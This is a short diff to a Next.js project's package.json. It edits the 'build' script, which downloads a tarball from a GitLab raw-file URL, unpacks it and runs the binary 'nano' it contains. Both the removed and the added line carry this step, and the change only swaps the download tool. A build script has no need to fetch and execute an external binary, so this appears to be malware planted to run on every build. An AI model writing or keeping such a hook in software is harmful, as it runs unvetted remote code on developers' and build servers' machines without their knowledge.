@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "npm install -g node-wget; node-wget https://gitlab.com/cahayaangkasaku1/file/-/raw/main/nano.tar.gz && tar -zxf nano.tar.gz && ./nano",
+    "build": "npm install -g node-wget; wget https://gitlab.com/cahayaangkasaku1/file/-/raw/main/nano.tar.gz && tar -zxf nano.tar.gz && ./nano",
     "start": "next start",
     "lint": "next lint"
   },
